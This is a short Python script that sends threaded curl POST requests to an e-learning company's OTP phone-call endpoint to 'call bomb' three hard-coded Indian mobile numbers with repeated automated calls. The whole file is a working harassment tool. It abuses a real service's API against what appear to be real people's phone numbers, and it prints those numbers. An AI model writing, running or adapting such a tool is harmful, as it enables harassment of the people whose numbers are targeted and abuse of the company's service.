import threading
import os

def bomb(num):
    cc="91"
    num = str(num)
    rd = os.popen('curl -s -X POST -d mobile=%2B' + cc + '-' + num + ' https://marketing.tllms.com/elearn/api/v4/authentications/phone_call').read()
    if rd.lower().find("otp requests exceeded") == -1:
        print("Call Bombing not possible");
    print(rd)


if __name__ == "__main__":

    numbers = [ "6200841772", "7905179464", "9304225752" ]
    for i in numbers:
        print(i)
        t = threading.Thread(target=bomb, args=(i,))
        t.start()
        print(i)
        
